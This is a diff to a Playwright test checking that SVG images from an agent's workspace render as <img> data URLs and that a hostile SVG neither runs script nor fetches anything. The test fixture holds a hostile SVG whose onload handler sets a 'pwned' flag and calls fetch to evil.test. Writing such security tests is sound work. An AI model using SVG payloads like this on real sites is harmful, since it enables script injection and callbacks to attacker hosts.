@@ -1,6 +1,6 @@
 import {test,expect} from "@playwright/test";
 test.use({browserName:"webkit"});
-// An agent's SVG renders through <img> (blob: URL): it is drawn, but a hostile
+// An agent's SVG renders through <img> (cached data URL): it is drawn, but a hostile
 // one never runs its script and never fetches its external references.
 const LOGO=`<svg xmlns="http://www.w3.org/2000/svg" width="120" height="120" viewBox="0 0 120 120"><circle cx="60" cy="60" r="50" fill="#5ad"/></svg>`;
 const HOSTILE=`<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="80" height="80" onload="parent.__pwned=1;fetch('https://evil.test/onload')">
@@ -35,7 +35,7 @@ test("workspace SVG images render as <img> and a hostile SVG neither runs nor fe
  await expect(logo).toBeVisible();await expect(hostile).toBeVisible();
  await expect.poll(()=>logo.evaluate((i:HTMLImageElement)=>i.complete&&i.naturalWidth)).toBe(120);
  await expect.poll(()=>hostile.evaluate((i:HTMLImageElement)=>i.complete&&i.naturalWidth)).toBe(80);
- expect(await logo.getAttribute('src')).toMatch(/^blob:/);
+ expect(await logo.getAttribute('src')).toMatch(/^data:image\/svg\+xml;base64,/);
  await expect(page.locator('.md-workspace-image-missing')).toHaveCount(0);
  // The markup is never inlined: no script, foreignObject or iframe reached the DOM.
  expect(await page.locator('main script, main foreignObject, main iframe, main image').count()).toBe(0);
